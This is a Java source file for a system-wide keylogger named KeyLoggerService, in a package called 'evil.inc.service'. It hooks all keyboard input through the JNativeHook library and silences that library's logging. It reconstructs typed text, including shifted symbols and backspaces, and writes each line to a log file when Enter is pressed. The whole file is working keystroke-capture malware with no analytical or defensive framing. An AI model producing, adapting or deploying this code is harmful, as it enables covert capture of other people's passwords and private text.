package evil.inc.service;


import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLoggerService implements NativeKeyListener {

    private final static org.apache.log4j.Logger log = org.apache.log4j.Logger.getLogger(KeyLoggerService.class);
    private final StringBuilder stringBuilder = new StringBuilder();
    private int startShiftIndex;

    public static void main(String[] args) {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLoggerService());

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase();
        switch (e.getKeyCode()) {
            case 2:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("!");
                } else {
                    stringBuilder.append("1");
                }
                return;
            case 3:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("@");
                } else {
                    stringBuilder.append("2");
                }
                return;
            case 4:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("#");
                } else {
                    stringBuilder.append("3");
                }
                return;
            case 5:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("$");
                } else {
                    stringBuilder.append("4");
                }
                return;
            case 6:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("%");
                } else {
                    stringBuilder.append("5");
                }
                return;
            case 7:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("^");
                } else {
                    stringBuilder.append("6");
                }
                return;
            case 8:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("&");
                } else {
                    stringBuilder.append("7");
                }
                return;
            case 9:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("*");
                } else {
                    stringBuilder.append("8");
                }
                return;
            case 10:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("(");
                } else {
                    stringBuilder.append("9");
                }
                return;
            case 11:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append(")");
                } else {
                    stringBuilder.append("0");
                }
                return;
            case NativeKeyEvent.VC_ALT:
            case NativeKeyEvent.VC_CONTROL:
                stringBuilder.append("");
                return;
            case NativeKeyEvent.VC_TAB:
                stringBuilder.append(" TAB ");
                return;
            case NativeKeyEvent.VC_SHIFT:
            case 3638:
                startShiftIndex = stringBuilder.length();
                return;
            case NativeKeyEvent.VC_ENTER:
                stringBuilder.append("\nENTER");
                log.info(stringBuilder.toString());
                stringBuilder.setLength(0);
                return;
            case NativeKeyEvent.VC_BACKSPACE:
                if (stringBuilder.length() <= 0) {
                    stringBuilder.append(" BACKSPACE ");
                } else {
                    backspace();
                    log.info(stringBuilder.toString());
                }
                return;
            case NativeKeyEvent.VC_SEMICOLON:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append(":");
                } else {
                    stringBuilder.append(";");
                }
                return;
            case NativeKeyEvent.VC_PERIOD:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append(">");
                } else {
                    stringBuilder.append(".");
                }
                return;
            case NativeKeyEvent.VC_COMMA:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("<");
                } else {
                    stringBuilder.append(",");
                }
                return;
            case NativeKeyEvent.VC_BACK_SLASH:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("|");
                } else {
                    stringBuilder.append("\\");
                }
                return;
            case NativeKeyEvent.VC_SLASH:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("?");
                } else {
                    stringBuilder.append("/");
                }
                return;
            case NativeKeyEvent.VC_MINUS:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("_");
                } else {
                    stringBuilder.append("-");
                }
                return;
            case NativeKeyEvent.VC_EQUALS:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("+");
                } else {
                    stringBuilder.append("=");
                }
                return;
            case NativeKeyEvent.VC_SPACE:
                stringBuilder.append(" ");
                return;
            case NativeKeyEvent.VC_OPEN_BRACKET:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("{");
                } else {
                    stringBuilder.append("[");
                }
                return;
            case NativeKeyEvent.VC_CLOSE_BRACKET:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("}");
                } else {
                    stringBuilder.append("]");
                }
                return;
            case NativeKeyEvent.VC_QUOTE:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("\"");
                } else {
                    stringBuilder.append("\"");
                }
                return;
            case NativeKeyEvent.VC_BACKQUOTE:
                if ((e.getModifiers() & NativeKeyEvent.SHIFT_MASK) != 0) {
                    stringBuilder.append("~");
                } else {
                    stringBuilder.append("`");
                }
                return;
            case NativeKeyEvent.VC_F9:
                this.unregisterHook();
                return;
        }
        stringBuilder.append(keyPressed);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        switch (e.getKeyCode()) {
            case NativeKeyEvent.VC_ALT:
            case NativeKeyEvent.VC_CONTROL:
                stringBuilder.append("");
                return;
            case NativeKeyEvent.VC_SHIFT:
            case 3638:
                shift();
        }
    }


    private void shift() {
        int index = startShiftIndex;
        for (int i = index; i < stringBuilder.length(); i++) {
            if (Character.isAlphabetic(stringBuilder.charAt(i))) {
                stringBuilder.replace(i, i + 1, Character.toString(Character.toUpperCase(stringBuilder.charAt(i))));
            }
        }
    }

    private void backspace() {
        stringBuilder.replace(stringBuilder.length() - 1, stringBuilder.length(), "");
    }

    private void unregisterHook() {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (Exception ex) {
            System.err.println(ex);
        }
    }

}